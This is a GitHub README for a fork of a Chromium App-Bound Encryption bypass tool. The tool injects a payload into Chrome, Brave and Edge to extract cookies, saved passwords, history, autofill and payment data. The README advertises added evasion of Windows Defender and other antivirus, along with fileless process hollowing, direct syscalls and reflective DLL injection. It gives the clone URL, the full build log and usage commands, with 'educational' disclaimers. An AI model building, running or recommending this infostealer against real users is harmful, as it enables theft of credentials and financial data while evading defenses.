# Chrome App-Bound Encryption Decryption – Enhanced Fork

![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20x64%20%7C%20ARM64-lightgrey)
![Languages](https://img.shields.io/badge/code-C%2B%2B%20%7C%20ASM-9cf)

---

## 📌 Overview

This is a **fork** of [@xaitax’s original Chrome App-Bound Encryption Decryption project](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).  
It has been updated to:

- 🛠  **Get Autofills and History** fully.  
- 🔒 **Evade some static detections** in Windows Defender and other AV tools.  
- 📄 **Improve clarity and organization** of the README for easier usage.  
- ⛓  **Concurrency** for injecting into all 3 browsers together at the same time.  

The tool demonstrates an **in-memory bypass** of **Chromium’s App-Bound Encryption (ABE)** using  
**Direct Syscall-based Reflective Process Hollowing**.  
It launches a legitimate browser in a suspended state, injects a payload to hijack its security context, and operates filelessly to extract:

- Cookies  
- Passwords  
- Browsing history  
- Autofill data  
- Payment information  

> **Disclaimer:** This project is for **educational and security research purposes only**.  
> Do **not** use it for malicious activities.  

---
## ⚙️ All Features

### Core Functionality
- 🔓 Full user-mode decryption of cookies, passwords, autofills, history and payment methods.
- 📁 Discovers and processes all user profiles (Default, Profile 1, etc.).
- 📝 Exports all extracted data into structured JSON files, organized by profile.

### Stealth & Evasion
- 💼 **No Admin Privileges Required:** Operates entirely within the user's security context.
- 🛡️ **Fileless Payload Delivery:** In-memory decryption and injection of an encrypted resource.
- 🛡️ **Direct Syscall Engine:** Bypasses common endpoint defenses by avoiding hooked user-land APIs for all process operations.
- 🤫 **Process Hollowing:** Creates a benign, suspended host process for the payload, avoiding injection into potentially monitored processes.
- 👻 **Reflective DLL Injection:** Stealthily loads the payload without suspicious `LoadLibrary` calls.
- 🔒 **Proactive File-Lock Mitigation:** Automatically terminates browser utility processes that hold locks on target database files.


### Compatibility & Usability
- 🌐 Works on **Google Chrome**, **Brave**, & **Edge**.
- 💻 Natively supports **x64** and **ARM64** architectures.
- 🚀 **Standalone Operation:** Automatically creates a new browser process to host the payload, requiring no pre-existing running instances.
- 📁 Customizable output directory for extracted data.


---

## 📦 Supported & Tested Versions

| Browser            | Tested Version (x64 & ARM64) |
| ------------------ | ---------------------------- |
| **Google Chrome**  | 139.0.7258.155               |
| **Brave**          | 1.80.124 (138.0.7204.168)    |
| **Microsoft Edge** | 139.0.3405.52                |

---


## 🔧 Build Instructions

This project uses a simple, robust build script that handles all compilation and resource embedding automatically.

1. **Clone** this repository. using :
```bash
git clone https://github.com/00nx/Chrome-App-Bound-Encryption-Bypass.git
```

2. Open a **Developer Command Prompt for VS** (or any MSVC‑enabled shell).

3. Run the build script ( make.bat ) from the project root:

   ```bash
    PS> make.bat
    --------------------------------------------------
    |          Chrome Injector Build Script          |
    --------------------------------------------------

    [INFO] Verifying build environment...
    [ OK ] Developer environment detected.
    [INFO] Target Architecture: arm64

    [INFO] Performing pre-build setup...
    [INFO]   - Creating fresh build directory: build
    [ OK ] Setup complete.

    -- [1/6] Compiling SQLite3 Library ------------------------------------------------
    [INFO]   - Compiling C object file...
    cl /nologo /W3 /O2 /MT /GS- /c libs\sqlite\sqlite3.c /Fo"build\sqlite3.obj"
    sqlite3.c
    [INFO]   - Creating static library...
    lib /NOLOGO /OUT:"build\sqlite3.lib" "build\sqlite3.obj"
    [ OK ] SQLite3 library built successfully.

    -- [2/6] Compiling Payload DLL (chrome_decrypt.dll) ------------------------------------------------
    [INFO]   - Compiling C file (reflective_loader.c)...
    cl /nologo /W3 /O2 /MT /GS- /c src\reflective_loader.c /Fo"build\reflective_loader.obj"
    reflective_loader.c
    [INFO]   - Compiling C++ file (chrome_decrypt.cpp)...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\sqlite /c src\chrome_decrypt.cpp /Fo"build\chrome_decrypt.obj"
    chrome_decrypt.cpp
    [INFO]   - Linking objects into DLL...
    link /NOLOGO /DLL /OUT:"build\chrome_decrypt.dll" "build\chrome_decrypt.obj" "build\reflective_loader.obj" "build\sqlite3.lib" bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /IMPLIB:"build\chrome_decrypt.lib"
      Creating library build\chrome_decrypt.lib and object build\chrome_decrypt.exp
    [ OK ] Payload DLL compiled successfully.

    -- [3/6] Compiling Encryption Utility (encryptor.exe) ------------------------------------------------
    [INFO]   - Compiling and linking...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\chacha src\encryptor.cpp /Fo"build\encryptor.obj" /link /NOLOGO /DYNAMICBASE /NXCOMPAT /OUT:"build\encryptor.exe"
    encryptor.cpp
    [ OK ] Encryptor utility compiled successfully.

    -- [4/6] Encrypting Payload DLL ------------------------------------------------
    [INFO]   - Running encryption process...
    build\encryptor.exe build\chrome_decrypt.dll build\chrome_decrypt.enc
    Successfully ChaCha20-encrypted build\chrome_decrypt.dll to build\chrome_decrypt.enc
    [ OK ] Payload encrypted to chrome_decrypt.enc.

    -- [5/6] Compiling Resource File ------------------------------------------------
    [INFO]   - Compiling .rc to .res...
    rc.exe /i "build" /fo "build\resource.res" src\resource.rc
    Microsoft (R) Windows (R) Resource Compiler Version 10.0.10011.16384
    Copyright (C) Microsoft Corporation.  All rights reserved.

    [ OK ] Resource file compiled successfully.

    -- [6/6] Compiling Final Injector (chrome_inject.exe) ------------------------------------------------
    [INFO]   - Assembling syscall trampoline (arm64)...
    armasm64.exe -nologo "src\syscall_trampoline_arm64.asm" -o "build\syscall_trampoline_arm64.obj"
    [INFO]   - Compiling C++ source (chrome_inject.cpp)...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /Ilibs\chacha /c src\chrome_inject.cpp /Fo"build\chrome_inject.obj"
    chrome_inject.cpp
    [INFO]   - Compiling C++ source (syscalls.cpp)...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 /c src\syscalls.cpp /Fo"build\syscalls.obj"
    syscalls.cpp
    [INFO]   - Linking final executable...
    cl /nologo /W3 /O2 /MT /GS- /EHsc /std:c++17 "build\chrome_inject.obj" "build\syscalls.obj" build\syscall_trampoline_arm64.obj "build\resource.res" version.lib shell32.lib /link /NOLOGO /DYNAMICBASE /NXCOMPAT /OUT:".\chrome_inject.exe"
    [ OK ] Final injector built successfully.

    --------------------------------------------------
    |                 BUILD SUCCESSFUL               |
    --------------------------------------------------

      Final Executable: .\chrome_inject.exe

    [INFO] Build successful. Final artifacts are ready.
   ```

This single command will compile all components and produce a self-contained `chrome_inject.exe` in the root directory.

## 🚀 Usage

```bash
Usage: chrome_inject.exe [options]
Example : chrome_inject.exe -o .\output
```

### Options

- `--output-path <path>` or `-o <path>`
  Specifies the base directory for output files.
  Defaults to `.\output\` relative to the injector's location.
  Data will be organized into subfolders: `<path>/<BrowserName>/<ProfileName>/`.

- `--verbose` or `-v`
  Enable extensive debugging output from the injector.

- `--help` or `-h`
  Show this help message.

Future Updates will be Documented in : 
[**FORK_CHANGES.md**](FORK_CHANGES.md)

---

## 📜 License

This project is licensed under the [MIT License](LICENSE).  
Attribution to the original author is maintained.

---



> [!CAUTION]
> This project is an **educational proof-of-concept** showing how the new ABE bypass works.  
> It is **not** intended for malicious use.
>
> **This is not a full-featured infostealer or a guaranteed EDR evasion tool.**  
> While it uses advanced techniques, its sole purpose is to demonstrate and analyze the ABE mechanism—not to provide operational stealth.  
> Use only in compliance with applicable legal and ethical guidelines.


